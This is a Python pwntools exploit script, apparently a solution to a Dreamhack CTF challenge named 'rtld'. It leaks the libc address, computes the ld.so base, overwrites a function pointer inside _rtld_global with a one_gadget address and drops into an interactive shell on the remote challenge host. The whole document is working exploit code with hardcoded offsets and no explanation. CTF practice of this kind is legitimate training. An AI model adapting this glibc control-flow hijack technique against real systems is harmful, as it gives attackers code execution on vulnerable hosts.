#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 22133
HOST = "host1.dreamhack.games"
exe = context.binary = ELF('./rtld_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            brva 0x0000000000000B9D
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# VARIABLE


# PAYLOAD
p.recvuntil(b'stdout: ')
libc_leak = int(p.recvuntil(b'\n', drop=True), 16)
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
log.info("Libc base: " + hex(libc.address))
system = libc.sym.system
gadget = [0x4527a, 0xf03a4, 0xf1247]
# ld.address = libc.address + 0x400000
ld.address = libc.address + 0x3ca000
log.info("Ld base: " + hex(ld.address))
ld_global = ld.sym._rtld_global
ld_recursive = ld_global + 3848

# GDB()
p.sendlineafter(b'addr: ', str(ld_recursive))
p.sendlineafter(b'value: ', str(gadget[0] + libc.address))

p.interactive()